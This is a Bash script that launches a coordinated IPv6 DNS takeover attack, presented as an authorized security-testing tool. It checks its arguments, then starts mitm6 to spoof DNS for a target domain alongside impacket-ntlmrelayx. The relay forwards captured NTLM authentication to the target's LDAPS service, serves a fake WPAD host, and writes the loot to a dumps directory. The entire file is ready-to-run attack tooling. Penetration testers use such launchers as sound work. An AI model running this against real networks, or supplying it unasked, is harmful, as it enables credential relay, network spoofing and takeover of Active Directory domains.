#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

# hexahavoc.sh - authorized IPv6 DNS security testing launcher (Linux).
target_domain=""
target_ip=""
interface="eth0"
loot_dir="dumps"
verbose=0
silent=0
session_name=""
created_session=0
keep_session=0
duration=""
deadline=0
session_target=""

usage() {
  cat <<'HELP'
Usage: hexahavoc.sh -d <domain> -t <IP> [-i <interface>] [-l <directory>] [--duration <seconds>] [-v | -s]
  -d  Target domain (required)
  -t  Literal IPv4 or IPv6 address (required)
  -i  Network interface (default: eth0)
  -l  Parent directory for timestamped run folders (default: dumps)
  --duration  Stop the new session after this many seconds (positive integer)
  -v  Trace launcher commands (may expose arguments in terminal output)
  -s  Suppress launcher status messages; tool output and errors remain visible
  -h  Show help
HELP
}

fail() { printf 'Error: %s\n' "$*" >&2; exit 1; }
log() { if (( silent == 0 )); then printf '%s\n' "$*"; fi; }

cleanup() {
  local status=$?
  trap - EXIT
  if (( created_session == 1 && keep_session == 0 )); then
    if tmux has-session -t "$session_target" 2>/dev/null &&
       ! tmux kill-session -t "$session_target" 2>/dev/null; then
      printf 'Warning: could not clean up session %s; check tmux manually.\n' "$session_name" >&2
    fi
  fi
  exit "$status"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
trap 'exit 129' HUP

while getopts ':d:t:i:l:vsh-:' opt; do
  case "$opt" in
    d) target_domain=$OPTARG ;;
    t) target_ip=$OPTARG ;;
    i) interface=$OPTARG ;;
    l) loot_dir=$OPTARG ;;
    v) verbose=1 ;;
    s) silent=1 ;;
    h) usage; exit 0 ;;
    -)
      case "$OPTARG" in
        duration)
          (( OPTIND <= $# )) || fail '--duration requires a value.'
          duration=${!OPTIND}
          OPTIND=$((OPTIND + 1))
          ;;
        duration=*) duration=${OPTARG#duration=} ;;
        *) fail "Unknown option: --$OPTARG. Use -h for help." ;;
      esac
      [[ "$duration" =~ ^[1-9][0-9]*$ && ${#duration} -le 10 ]] || fail '--duration must be a positive integer (seconds).'
      (( duration <= 2147483647 )) || fail '--duration must not exceed 2147483647 seconds.'
      ;;
    :) fail "Option -$OPTARG requires a value." ;;
    \?) fail "Unknown option: -$OPTARG. Use -h for help." ;;
  esac
done
shift "$((OPTIND - 1))"
(( $# == 0 )) || fail 'Unexpected positional arguments. Use -h for help.'
(( verbose == 0 || silent == 0 )) || fail '-v and -s cannot be combined.'
[[ -n "$target_domain" && -n "$target_ip" ]] || fail 'Both -d and -t are required.'
[[ -n "$interface" && -n "$loot_dir" ]] || fail 'Interface and output directory cannot be empty.'

# Reject malformed DNS labels, including leading/trailing hyphens.
[[ ${#target_domain} -le 253 && "$target_domain" == *.* ]] || fail 'Invalid domain format.'
[[ "$target_domain" != *. ]] || fail 'Use a domain without a trailing dot.'
IFS='.' read -r -a labels <<< "$target_domain"
for label in "${labels[@]}"; do
  [[ ${#label} -le 63 && "$label" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$ ]] || fail 'Invalid domain label.'
done

[[ "$(uname -s)" == Linux ]] || fail 'This launcher requires Linux (macOS is not supported).'
for cmd in tmux mitm6 impacket-ntlmrelayx ip python3 mkdir sleep date mktemp tee; do
  command -v "$cmd" >/dev/null 2>&1 || fail "Required command not found: $cmd"
done
(( EUID == 0 )) || fail 'Run this script as root.'

# Parse a literal address without DNS queries or an ICMP reachability gate.
ip_version=$(python3 - "$target_ip" <<'PYIP'
import ipaddress
import sys
try:
    if '%' in sys.argv[1]:
        raise ValueError('Scoped IPv6 addresses are not supported')
    print(ipaddress.ip_address(sys.argv[1]).version)
except ValueError:
    sys.exit(1)
PYIP
) || fail 'Target must be a literal IPv4 or IPv6 address (without a zone ID).'
ip link show dev "$interface" >/dev/null 2>&1 || fail "Interface not found: $interface"

if (( verbose == 1 )); then set -x; fi
safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
session_name="ipv6_dns_takeover_${safe_domain}"
session_target="=$session_name"

# Do not claim ownership of an existing session or kill it on an unrelated error.
if tmux has-session -t "=$session_name" 2>/dev/null; then
  [[ -z "$duration" ]] || fail '--duration applies only to a new session; stop the existing session first.'
  [[ -t 0 && -t 1 ]] || fail "Session $session_name already exists; manage it with tmux."
  printf 'Session %s exists. Attach [a] or kill and exit [k]: ' "$session_name"
  read -r user_choice || fail 'No session choice received.'
  case "$user_choice" in
    a|A) tmux attach-session -t "=$session_name"; exit $? ;;
    k|K) tmux kill-session -t "=$session_name"; exit $? ;;
    *) fail 'Expected a or k.' ;;
  esac
fi
[[ -t 0 && -t 1 ]] || fail 'An interactive terminal is required to attach to tmux.'
[[ -z "${TMUX:-}" ]] || fail 'Run this launcher outside tmux to avoid a nested attachment.'

# Restrict newly created output files and use a stable absolute directory.
umask 077
mkdir -p -- "$loot_dir"
loot_dir=$(cd -- "$loot_dir" && pwd -P)
[[ -w "$loot_dir" ]] || fail "Output directory is not writable: $loot_dir"
# Each run gets its own directory, even when two runs start in the same second.
execution_stamp=$(date '+%Y-%m-%d_%H-%M-%S')
run_dir=$(mktemp -d "$loot_dir/${execution_stamp}_XXXXXX")
mitm_log="$run_dir/mitm6.log"
relay_log="$run_dir/ntlmrelayx.log"
: > "$mitm_log"
: > "$relay_log"
log "Saving this run's output to: $run_dir"
relay_target="ldaps://$target_ip"
if [[ "$ip_version" == 6 ]]; then relay_target="ldaps://[$target_ip]"; fi

# Quote each argument for the tmux shell. Never interpolate raw inputs as code.
shell_command() {
  local arg
  printf 'exec'
  for arg in "$@"; do
    arg=${arg//\'/\'\\\'\'}
    printf " '%s'" "$arg"
  done
}

# Capture stdout and stderr from the first byte, while displaying both in tmux.
# Positional arguments keep paths and tool arguments out of the shell program.
logged_command() {
  shell_command /bin/bash -o pipefail -c '
    umask 077
    export PYTHONUNBUFFERED=1
    log_file=$1
    shift
    "$@" 2>&1 | tee -a -- "$log_file"
  ' hexahavoc-log "$@"
}

log "Creating session $session_name..."
# The logging wrapper exits with its pipeline; no interactive shell stays open.
mitm_command=$(logged_command "$mitm_log" mitm6 -i "$interface" -d "$target_domain")
mitm_pane=$(tmux new-session -d -P -F '#{pane_id}' -s "$session_name" -n mitm6 "$mitm_command")
created_session=1
# Use the immutable session ID so a later same-name session is never targeted.
owned_session_id=$(tmux display-message -p -t "$mitm_pane" '#{session_id}')
session_target=$owned_session_id
if [[ -n "$duration" ]]; then
  deadline=$((SECONDS + duration))
  # A session-owned timer survives client detach and is closed with the session.
  # No login shell or interactive prompt remains after the timer command exits.
  timer_command=$(shell_command /bin/bash -c 'sleep "$1" && exec tmux kill-session -t "$2"' hexahavoc-timer "$duration" "$session_target")
  tmux new-window -d -t "$session_target" -n duration "$timer_command"
  log "This session will close automatically after $duration seconds, even if detached."
fi

finish_if_expired() {
  if [[ -n "$duration" ]] && (( SECONDS >= deadline )) &&
     ! tmux has-session -t "$session_target" 2>/dev/null; then
    log "Duration of $duration seconds reached; session closed."
    keep_session=1
    exit 0
  fi
}

relay_command=$(logged_command "$relay_log" impacket-ntlmrelayx -6 -t "$relay_target" -wh "fakewpad.$target_domain" -l "$run_dir")
relay_pane=$(tmux new-window -d -P -F '#{pane_id}' -t "$session_target" -n impacket-ntlmrelayx "$relay_command") || {
  finish_if_expired
  fail 'Could not create the ntlmrelayx window.'
}

check_pane() {
  local state
  state=$(tmux display-message -p -t "$1" '#{pane_dead}') || {
    finish_if_expired
    fail "$2 exited during startup."
  }
  if [[ "$state" != 0 ]]; then
    finish_if_expired
    fail "$2 exited during startup."
  fi
}
# These are session-owned process liveness checks, not service readiness checks.
for _ in 1 2 3; do
  sleep 1
  check_pane "$mitm_pane" mitm6
  check_pane "$relay_pane" impacket-ntlmrelayx
done
log 'Both processes survived the startup check; inspect their output for readiness.'
log "Attaching to $session_name. Detaching leaves the tools running."
tmux attach-session -t "$session_target" || {
  finish_if_expired
  fail 'Could not attach to the session.'
}
# Successful detach deliberately preserves the session. Failures clean it up.
keep_session=1
